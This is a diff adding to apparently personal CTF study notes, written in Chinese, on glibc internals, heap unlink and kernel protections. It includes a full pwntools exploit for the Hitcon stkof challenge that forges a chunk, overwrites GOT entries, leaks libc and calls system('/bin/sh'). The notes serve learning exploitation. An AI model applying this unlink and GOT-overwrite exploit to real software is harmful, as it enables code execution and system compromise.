@@ -12,6 +12,7 @@
 * This will become a table of contents (this text will be scrapped).
 {:toc}
 
+---
 
 ### ret2_dl_runtime:
 
@@ -280,7 +281,7 @@ _dl_runtime_resolve(link_map,reloc_arg)
 
 ---
   
-###  Symbol Resolution 
+####  Symbol Resolution 
 * dl_runtime_resolve -> _dl_fixup(link_map,reloc_arg)
 * 可以直接掃整個 .dynsym 去檢查st_name 找需要的symbol
 * 但是太花時間所以使用一個小小的 GNU Hash table 
@@ -324,10 +325,168 @@ python version :
 
 ---
 ### IO_FILE_structure:
+
+---
+
+- stdin,stdot,stderr
+- ![](https://i.imgur.com/2Y8Pcth.png)
+
+
+---
+
+- _IO_FILE_plus
+- ![](https://i.imgur.com/w9xE6zs.png)
+
+
+---
+
+- FILE_structure 
+- ![](https://i.imgur.com/XBDBk3K.png)
+
+---
+
+- vtable
+- ![](https://i.imgur.com/XaJJNIV.png)
+
+
+---
+
+- vtable 
+- ![](https://i.imgur.com/kMCCtyI.png)
+
+
+---
 ---
 ## heap:
 ---
 ### unlink:
+* glibc2.23以後有加check。
+* library source code : 
+    
+![](https://i.imgur.com/MWBvsHb.png)
+* 會先看size是否為small bin size 
+* 檢查prev_size 跟自己size是否相符 否:corrupted size vs prev_size
+* unlink 觸發在free的時候前後可以merge
+* 會檢查 fd->bk != p , bk->fd != p 分別是不是要unlink的chunk
+    之後就double linked link 裡面就會unlink
+* merge:
+    * ![](https://i.imgur.com/CGrrpEL.png)
+
+---
+
+以Hitcon 的stkof來熟悉unlink
+* 這題會把malloc 的pointer 儲存到global array(並且index從1開始)
+* 存在heap overflow 可以改到下面(fd,bk)
+* small bin size(free的)
+* 偽造出要unlinked的chunk
+    
+因為這題沒有setvbuf來作緩衝所以第一次io(fgets)時會malloc出1024的size,所以可以先allcoate一塊去把它切開。
+
+重點主要在偽造free chunk 要滿足unlink的constrain。
+* 在allocate切完後緊接allocate(0x30),(0x80 small bin size 要free的)
+* 在0x30 ~ 0x80 之間作偽造freechunk
+ ![](https://i.imgur.com/IcZOuVL.png)
+---
+   * 滿足chunksize = prev_size(next_chunk) memory layout
+        * |00000000 00000040|
+        * |00000000 00000020| -> 偽造的size(這裡的inuse bit不重要)且是global[2]
+        * |0x602138 0x602140| -> 目標的fd,bk(過檢查)
+        * |00000020 0xpadddd|  ->滿足size的檢查
+        * |00000030 00000090| -> 偽造prev_size跟inuse bit為0x90(原本0x91)
+* 滿足 FD->bk = p , BK->fd = p 這邊需注意(FD = p->fd , BK = p->bk)位置
+![](https://i.imgur.com/cg2CM2k.png)
+以圖來說0x1350540是fake chunk偽造的地方 , 0x602150是&fake_chunk
+也就是p,所以FD = p -> fd && FD->bk=p 時代表:0x602150需要去減0x18這樣FD->bk才會是p(64bits data structure),相對的Bk->fd=p則需減去0x10。
+    * 偽造的fd = 0x602138 = 0x602150(&fake_chunk)-0x18
+    * 偽造的bk = 0x602140 = 0x602150(&fake_chunk)-0x10
+
+---
+
+* 解題:
+    * 漏洞:
+        * edit的地方fread存在heapoverflow。
+        * ![](https://i.imgur.com/GVxhgWP.png)
+
+    * 流程:
+        * 偽造free chunk(payload1)
+        * unlinked 過基本上在0x602138那邊透過edit()可以任意寫
+        * 把0x602148那邊先改free_got,puts_got,atoi_got(payload2)
+        * leak只要把free_got改成puts_plt就可以用puts(puts_got)來leak
+        * 算出libc_base後把atoi_got改system之後input /bin/sh就拿shell了
+
+### Hitcon_stkof exp:
+
+```python
+#!/usr/bin/env python2
+#-*-coding:utf-8 -*-
+from pwn import *
+context.terminal =  ['tmux','split','-h']
+#context.log_level = 'debug'
+p = process('./stkof')
+binary = ELF('./stkof')
+libc = ELF('./libc.so.6')
+
+head = 0x602140
+
+def alloc(size):
+    p.sendline('1')
+    p.sendline(str(size))
+    p.recvuntil('OK\n')
+
+def edit(idx,cont):
+    p.sendline('2')
+    p.sendline(str(idx))
+    p.sendline(str(len(cont)))
+    p.send(cont)
+    p.recvuntil('OK\n')
+
+def free(idx):
+    p.sendline('3')
+    p.sendline(str(idx))
+
+payload1 = ""
+payload1 += p64(0)
+payload1 += p64(0x20)
+payload1 += p64(head+0x10-0x18)
+payload1 += p64(head+0x10-0x10)
+payload1 += p64(0x20)
+payload1 += "D"*8
+payload1 += p64(0x30)
+payload1 += p64(0x90)
+
+alloc(0x100)#1
+alloc(0x30) #2
+alloc(0x80) #3
+edit(2,payload1)
+#gdb.attach(proc.pidof(p)[0])
+# unlink
+free(3)
+p.recvuntil('OK\n')
+#gdb.attach(proc.pidof(p)[0])
+payload2 = ""
+payload2 += "deadbeef"
+payload2 += p64(binary.got['free'])
+payload2 += p64(binary.got['puts'])
+payload2 += p64(binary.got['atoi'])
+edit(2,payload2)
+#gdb.attach(proc.pidof(p)[0])
+#leak : use puts_plt(puts_got)
+puts_plt = binary.plt['puts']
+edit(0,p64(puts_plt))
+free(1)
+leak = u64(p.recv(6).ljust(8,'\x00'))
+log.success('libc+puts_address : ' + hex(leak))
+libc_base = leak - libc.symbols['puts']
+log.success('libc_base : ' + hex(libc_base))
+#gdb.attach(proc.pidof(p)[0])
+system = libc_base + libc.symbols['system']
+edit(2,p64(system))
+p.sendline('/bin/sh\x00')
+
+p.interactive()
+```
+
+
 
 ### uaf:
 
@@ -341,4 +500,49 @@ python version :
 ## kernel:
 
 ### basic knowledge
+
+kernel mode : 
+![](https://i.imgur.com/7WTV6kA.png)
+
+
+* 如何進入kernel mode :
+    * int 0x80 , syscall , ioctl
+    * 系統異常
+    * 外部設備中斷
+* kernal 保護機制 : 
+    * KPTI : Kernel PageTable isolation
+    * KASLR : Kernel aslr 
+    * SMEP : Supervisor Mode Execution Prevention
+    * SMAP : Supervisor Mode Asscess Prevention
+    * Stack protector : Canary
+    * kptr_restrict : 允許查看kernel functions address
+    * dmesg_restrict : 允許使用printk查看輸出
+    * MMAP_MIN_ADDR : 不允許申請NULL(大小的memory)
+****
+
+#### ret2user
+
+* 中國比賽的題目連結: https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar
+* 環境安裝 : https://eternalsakura13.com/2018/03/31/b_core/
+* writeup : https://www.anquanke.com/post/id/172216
+
+---
+
+cpio解壓縮打包
+
+* 解壓縮流程
+    * 隨便創一個資料夾
+    * 把core.cpio 丟過去
+    * core.cpio 解壓縮要先把名子改成 core.cpio.gz -> gunzip core.cpio.gz
+    * cpio -idmv < NAME.cpio
+    * 把裡面的NAME.cpio刪掉
+    * 整個解壓縮後可以去init初始化的檔案中更改一些東西
+* 打包
+    * 用解壓縮後裡面有的shell script 去包回去(expliot也是這樣包回去)
+    ```sh
+    find . -print0 \
+    | cpio --null -ov --format=newc \
+    | gzip -9 > $1
+    ```
+    
 
